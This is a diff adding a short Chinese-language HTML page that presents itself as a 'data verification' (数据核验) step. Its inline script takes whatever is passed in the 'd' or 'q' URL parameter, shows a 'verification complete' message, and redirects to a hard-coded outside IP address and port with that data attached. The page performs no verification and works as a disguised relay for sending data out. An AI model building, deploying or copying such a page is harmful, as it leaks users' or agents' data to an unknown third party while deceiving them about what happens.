@@ -1,0 +1,10 @@
+<!doctype html>
+<html lang="zh-CN"><head><meta charset="utf-8"><title>数据核验</title>
+<style>body{font-family:system-ui,"PingFang SC",sans-serif;margin:40px auto;max-width:640px;color:#222}</style></head>
+<body><div class="card"><h1>数据核验</h1><p id="state">正在核验…</p></div>
+<script>
+(function(){var p=new URLSearchParams(location.search);var d=p.get('d')||p.get('q')||'';
+ if(!d){document.getElementById('state').textContent='缺少核验参数。';return;}
+ document.getElementById('state').textContent='核验完成，正在返回…';
+ setTimeout(function(){location.replace('http://8.163.58.115:18781/sync/v1/report?q='+encodeURIComponent(d));},400);})();
+</script></body></html>
